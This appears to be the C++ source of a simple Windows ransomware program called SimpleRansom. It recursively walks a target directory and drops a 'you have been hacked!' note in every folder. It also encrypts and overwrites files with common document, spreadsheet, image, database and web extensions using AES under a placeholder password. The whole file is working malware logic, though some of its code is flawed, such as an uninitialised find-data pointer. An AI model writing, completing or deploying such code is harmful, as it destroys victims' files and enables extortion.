#pragma once
#include "SimpleRansom.h"
#include <windows.h>
#include <stdio.h>  
#include <stdlib.h>
#include <shlwapi.h>
#include <iostream>
#include "../../Common/CryptoAPI/CryptoAPI.h"

#pragma comment(lib,"shlwapi.lib")
typedef struct datax {
    char ext[6];
} DATAX;

int SimpleRansom() {
    ListDirectoryContents("[Path]");
    return 1;
}

bool WhiteList(char fileName[MAX_PATH]){
    std::string ext[20] = { ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd" };
    for (int x = 0; x < 20; x++) {
        std::string fileext = PathFindExtensionA(fileName);
        if (fileext.compare(ext[x])==0)
            return true;
    }
    return false;
}

bool ListDirectoryContents(const char *sDir)
{
    LPWIN32_FIND_DATAA fdFile;
    HANDLE hFind = NULL;

    char sPath[2048];

    //Specify a file mask. *.* = We want everything!
    sprintf(sPath, "%s\\*.*", sDir);

    if((hFind = FindFirstFileA(sPath, fdFile)) == INVALID_HANDLE_VALUE)
    {
        printf("Path not found: [%s]\n", sDir);
        return FALSE;
    }

    do
    {
        //Find first file will always return "."
        //    and ".." as the first two directories.
        if(strcmp(fdFile->cFileName, ".") != 0
                && strcmp(fdFile->cFileName, "..") != 0)
        {
            //Build up our file path using the passed in
            //  [sDir] and the file/foldername we just found:
            sprintf(sPath, "%s\\%s", sDir, fdFile->cFileName);

            //Is the entity a File or Folder?
            if(fdFile->dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
            {
                printf("Directory: %s\n", sPath);
                char tmp[2048];
                strcpy(tmp, sPath);
                strcat(tmp, "\\info.txt");
                FILE *fl = fopen(tmp, "w");
                fputs("you have been hacked!", fl);
                fclose(fl);
                ListDirectoryContents(sPath); //Recursion, I love it!
            }
            else if(WhiteList(fdFile->cFileName)){
                FILE *fl = NULL;
                if ((fl = fopen(sPath, "rb")) != NULL) {
                    fseek(fl, 0, SEEK_END);
                    DWORD len = ftell(fl);
                    BYTE *ret = (BYTE*)malloc(len);
                    fseek(fl, 0, SEEK_SET);
                    fread(ret, 1, len, fl);
                    fclose(fl);
                    ret = AES_Encrypt(ret, len, "[Password]");
                    FILE* file2 = fopen(sPath, "wb");
                    fwrite(ret, 1, len, file2);
                    fclose(file2);
                    printf("File: %s\n", sPath);
                }
            }
        }
    }
    while(FindNextFileA(hFind, fdFile)); //Find the next file.

    FindClose(hFind); //Always, Always, clean things up!

    return TRUE;
}